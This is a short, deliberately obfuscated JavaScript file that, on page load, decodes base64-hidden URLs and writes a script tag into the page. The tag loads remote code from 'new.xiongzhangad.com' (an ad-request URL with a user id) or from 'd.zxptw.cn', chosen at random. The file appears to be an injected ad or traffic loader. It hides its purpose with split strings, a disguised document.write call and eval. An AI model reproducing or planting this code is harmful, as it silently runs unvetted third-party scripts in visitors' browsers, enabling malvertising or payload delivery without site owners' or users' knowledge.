function AcR8zQm_() {
    (function(a, k, e, R) {
        //闭包开始
        var mq = function(e) {
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            var t = "",
                n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx.indexOf(e.charAt(f++));
                o = sx.indexOf(e.charAt(f++));
                u = sx.indexOf(e.charAt(f++));
                a = sx.indexOf(e.charAt(f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String.fromCharCode(n);
                if (u != 64) {
                    t = t + String.fromCharCode(r);
                }
                if (a != 64) {
                    t = t + String.fromCharCode(i);
                }
            }
            return (function(e) {
                var t = "",
                    n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e.charCodeAt(n);
                    if (r < 128) {
                        t += String.fromCharCode(r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e.charCodeAt(n + 1);
                        t += String.fromCharCode((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e.charCodeAt(n + 1);
                        c3 = e.charCodeAt(n + 2);
                        t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
        //解码结束
        var be, bf, bg = '',
            bh = decodeURIComponent(k);
        be = parseInt(Date.parse(new Date()) / 100000);
        bf = ["JTJGJ|*|TJG", a, "YWN0aW9uJTNEY3l|*|jYWRnZXQ=", "YWRfY2xhc|*|3MlM0Q3", "dXNlcmlkJTNE|*|NTMyMQ==", "bG93dW5pb251c2Vybm|*|FtZSUzRA==", "Y2xpY2tzd|*|GF0ZSUzRDI=", "YWRzaG93dHlwZSUzREFkQ29kZ|*|V95Y2dzMjI=", "YWRfc2l6|*|ZSUzRDEwMHgxMDA=", "c2hvd3N|*|lbCUzRDMlMjZuZXdhZHNlbCUzRDE=", "bWF4YWRpZ|*|CUzRA==", "cHJvaGli|*|aXQlM0Q="];
        for (i in bf) {
            bg += decodeURIComponent(mq(bf[i].replace('/' + mq(R) + '/', '')));
            if(i > 1){
                bg += '&';
            };
        }
        bf = mq('PHNjcmlwdA==');
        bf += bh + mq('c3JjPSI=') + bg + "\"";
        bf += mq('Pjwvc2NyaXB0Pg==');
        //闭包结束
        var bi = decodeURIComponent(mq('aHR0cHMlM0ElMkYlMkZkLnp4cHR3LmNuJTJG'));
        bi = bi + be + '20497';
        bi = mq('PHNjcmlwdA==') + bh + mq('c3JjPSI=') + bi + "\"" + mq('Pjwvc2NyaXB0Pg==');

        var l = [bf,bi];
        var rand = X8bzEq.get_random(X8bzEq.weight);
        e['wr' + 'it' + 'e'](l[rand]);
    })('bmV' + '3Lnh' + 'pb25nem|*|' + 'hhbmdhZ|' + '*|C5jb20lMk' + 'ZjZi5hc' + '3B4JTNG', '%20', document, 'XHxcKlx8');
}
var X8bzEq = {
    weight: [10,10],
    get_random: function(weight) {
        var s = eval(weight.join('+'));
        var r = Math.floor(Math.random() * s);
        var w = 0;
        var n = weight.length - 1;
        for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
        return n;
    },
    init: function() {
        AcR8zQm_();
    }
}
X8bzEq.init();
